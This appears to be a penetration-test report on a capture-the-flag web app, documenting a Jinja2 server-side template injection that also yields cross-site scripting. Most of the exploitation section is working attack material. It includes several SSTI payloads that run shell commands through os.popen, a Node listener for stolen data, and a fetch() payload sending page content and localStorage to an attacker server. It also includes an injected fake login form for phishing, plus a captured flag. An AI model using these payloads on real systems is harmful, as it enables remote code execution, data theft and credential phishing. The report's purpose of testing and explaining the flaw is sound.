# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:45245
- **Assessment Date:** January 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements no authentication mechanisms - all endpoints are publicly accessible without any credential validation.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application implements no authorization architecture - there are no roles, permissions, or access control mechanisms.

**Cross-Site Scripting (XSS) Vulnerabilities:**
One critical XSS vulnerability was successfully exploited (XSS-VULN-01). A Server-Side Template Injection (SSTI) vulnerability in Jinja2 template rendering allows arbitrary JavaScript execution and server-side code execution. The vulnerability enabled CTF flag capture, data exfiltration, JavaScript execution in victim browsers, and credential phishing demonstrations. Impact is critical due to the ability to execute arbitrary code both server-side and client-side.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database implementation and performs no shell command execution with user-controllable input. While a Server-Side Template Injection (SSTI) vulnerability exists that enables code execution, it does not fit the traditional SQL/command injection pattern.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application makes no outbound HTTP requests, has no URL fetching functionality, and provides no mechanism to induce server-side requests to internal or external resources.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 45245/TCP (HTTP):** FastAPI application via Uvicorn - primary web application endpoint, publicly accessible, no HTTPS encryption

**Subdomain Discoveries:**
Multiple subdomains discovered via subfinder (mail.localhost, www.localhost, autodiscover.localhost, and others), but all appear to be test data or noise rather than actual application subdomains.

**Security Misconfigurations:**
- **Missing Security Headers:** No Strict-Transport-Security (HSTS), Content-Security-Policy (CSP), X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, or Referrer-Policy headers detected
- **Information Disclosure:** Server header leaks technology stack (uvicorn), auto-generated API documentation exposed at `/docs`, `/redoc`, and `/openapi.json` without authentication
- **Container Security:** Application runs as root (uid=0) within Docker container with writable root filesystem and no resource limits
- **No Authentication/Authorization:** Zero authentication mechanisms detected - all endpoints publicly accessible
- **No Rate Limiting:** No request throttling or brute-force protection mechanisms
- **No Web Application Firewall (WAF):** No request filtering or payload inspection
- **HTTP Only:** Application exposed over HTTP on port 45245 with no HTTPS enforcement

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS via Server-Side Template Injection (SSTI)

**Summary:**
- **Vulnerable location:** `GET http://localhost:45245/?username=<payload>`
- **Overview:** Server-Side Template Injection (SSTI) vulnerability in Jinja2 template rendering that allows arbitrary JavaScript execution and server-side code execution. User input is concatenated directly into a template string with autoescape disabled, enabling both XSS and RCE.
- **Impact:**
  - **CTF Flag Capture:** Successfully extracted flag from `/app/flag.txt` using SSTI
  - **Data Exfiltration:** Demonstrated extraction of page content, localStorage, and URL data
  - **JavaScript Execution:** Confirmed arbitrary JavaScript execution in victim browsers
  - **Credential Phishing:** Demonstrated ability to inject fake login forms
- **Severity:** Critical

**Prerequisites:**
- None - Vulnerability is publicly accessible without authentication
- Standard web browser (tested with Chrome/Playwright)
- Network access to http://localhost:45245

**Exploitation Steps:**

#### 1. CTF Flag Capture (Highest Priority)

**Step 1.1:** Exploit SSTI to read the flag file from server filesystem

Execute the following request to read `/app/flag.txt` using SSTI payload:

```bash
curl -s 'http://localhost:45245/?username=%7B%7B%20lipsum.__globals__%5B%27os%27%5D.popen%28%27cat%20%2Fapp%2Fflag.txt%27%29.read%28%29%20%7D%7D'
```

**URL-decoded payload:** `{{ lipsum.__globals__['os'].popen('cat /app/flag.txt').read() }}`

**How it works:**
- `lipsum` - Jinja2's built-in lorem ipsum generator function
- `__globals__` - Accesses the global namespace of the lipsum function
- `['os']` - Retrieves the os module from globals
- `.popen('cat /app/flag.txt')` - Executes shell command to read flag file
- `.read()` - Reads command output

**Response:**
```
Welcome FLAG{033873d017793af83634faa38187400ccb7825be36715947ba90b344653455d7}!
```

**Proof of Impact:**
**FLAG CAPTURED: `FLAG{033873d017793af83634faa38187400ccb7825be36715947ba90b344653455d7}`**

#### 2. Alternative SSTI Payloads (All Successful)

Multiple SSTI exploitation techniques were tested and all successfully extracted the flag:

**Payload 2.1 - Using builtins open():**
```
{{ self.__init__.__globals__.__builtins__['open']('/app/flag.txt').read() }}
```

**Payload 2.2 - Using class inheritance chain:**
```
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /app/flag.txt').read() }}
```

**Payload 2.3 - Using namespace object:**
```
{{ namespace.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}
```

**Payload 2.4 - Using cycler context:**
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }}
```

All five payloads successfully returned: `FLAG{033873d017793af83634faa38187400ccb7825be36715947ba90b344653455d7}`

#### 3. Standard XSS Impact - JavaScript Execution Confirmation

**Step 3.1:** Confirm JavaScript execution with alert dialog

Navigate to or send victim to:
```
http://localhost:45245/?username=<img src=x onerror=alert('XSS_CONFIRMED')>
```

**Result:** Alert dialog displays "XSS_CONFIRMED" in victim's browser

**Step 3.2:** Test script tag execution

Navigate to:
```
http://localhost:45245/?username=<script>console.log('XSS_SCRIPT_TAG')</script>
```

**Result:** Console output shows "XSS_SCRIPT_TAG"

**Step 3.3:** Confirm SSTI arithmetic (proves template injection)

```bash
curl -s 'http://localhost:45245/?username=%7B%7B7*7%7D%7D'
```

**Response:** `Welcome 49!` (confirms `{{7*7}}` was evaluated server-side)

#### 4. Data Exfiltration Demonstration

**Step 4.1:** Set up exfiltration listener server (attacker-controlled)

Create `exfil-server.js`:
```javascript
const http = require('http');
http.createServer((req, res) => {
  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      console.log('=== EXFILTRATED DATA ===');
      const data = JSON.parse(body);
      console.log('URL:', data.url);
      console.log('LocalStorage:', data.localStorage);
      console.log('HTML Preview:', data.html.substring(0, 200) + '...');
      console.log('========================');
    });
  }
  res.writeHead(200, {'Access-Control-Allow-Origin': '*'});
  res.end('OK');
}).listen(8888);
console.log('Exfiltration server listening on http://localhost:8888');
```

Run server:
```bash
node exfil-server.js
```

**Step 4.2:** Send XSS payload that exfiltrates data

Navigate victim to:
```
http://localhost:45245/?username=<script>fetch('http://localhost:8888/exfil',{method:'POST',body:JSON.stringify({url:location.href,localStorage:Object.fromEntries(Object.entries(localStorage)),html:document.documentElement.outerHTML})})</script>
```

**Proof of Impact:**
Server console shows:
```
=== EXFILTRATED DATA ===
URL: http://localhost:45245/?username=%3Cscript%3Efetch('http://localhost:8888/exfil'...
LocalStorage: {}
HTML Preview: <html><head></head><body>Welcome <script>fetch('http://localhost:8888/exfil'...
========================
```

**Demonstrated:** Arbitrary page data (URL, localStorage, HTML content) was successfully exfiltrated to attacker-controlled server

#### 5. Credential Phishing Demonstration

**Step 5.1:** Inject phishing form to capture credentials

Send victim to URL with phishing payload:
```
http://localhost:45245/?username=<img src=x onerror="document.body.innerHTML='<div style=max-width:400px;margin:50px auto;padding:30px;background:white;border:1px solid #ddd><h2>Security Alert</h2><p>Your session expired.</p><form id=f><input placeholder=Username><input type=password placeholder=Password><button>Login</button></form></div>';f.onsubmit=e=>{alert('Stolen: '+e.target[0].value);return false}">
```

**Result:**
- Original page content is replaced with convincing login form
- Form displays "Security Alert" message claiming session expired
- When victim enters credentials and clicks "Login", credentials are captured (demonstrated with alert, but could send to attacker server)

**Proof of Impact:** This demonstrates how XSS can be weaponized for social engineering attacks to steal user credentials through phishing

**Notes:**
- No Content Security Policy (CSP) prevents script execution
- No X-XSS-Protection header provides browser-level filtering
- No Web Application Firewall (WAF) blocks malicious payloads
- No rate limiting allows unlimited exploitation attempts
- Application has no authentication, so traditional session hijacking is not applicable, but the demonstrated impacts (flag capture, data theft, credential phishing) prove critical security risk
- Multiple SSTI exploitation paths exist, making the vulnerability highly robust and difficult to patch partially

**Vulnerability Root Cause:**
The vulnerability exists at `/app/main.py` lines 31-32:
```python
jinja2_env = Environment()  # autoescape=False by default
output = jinja2_env.from_string("Welcome " + username + "!").render()
```

The developer:
1. Created a raw Jinja2 Environment without enabling autoescape
2. Concatenated user input directly into template string
3. Used `from_string()` which processes template syntax in the string
4. Returned result as HTMLResponse, rendering it as executable HTML/JavaScript

**Complete Attack Chain:**
```
HTTP Request: /?username={{payload}}
    ↓
FastAPI extracts 'username' query parameter (no validation)
    ↓
String concatenation: "Welcome " + {{payload}} + "!"
    ↓
Jinja2 from_string() processes template syntax (autoescape=False)
    ↓
Template evaluates payload (SSTI/RCE on server)
    ↓
HTMLResponse renders output in browser (XSS on client)
    ↓
Impact: Flag capture, data exfiltration, credential theft
```
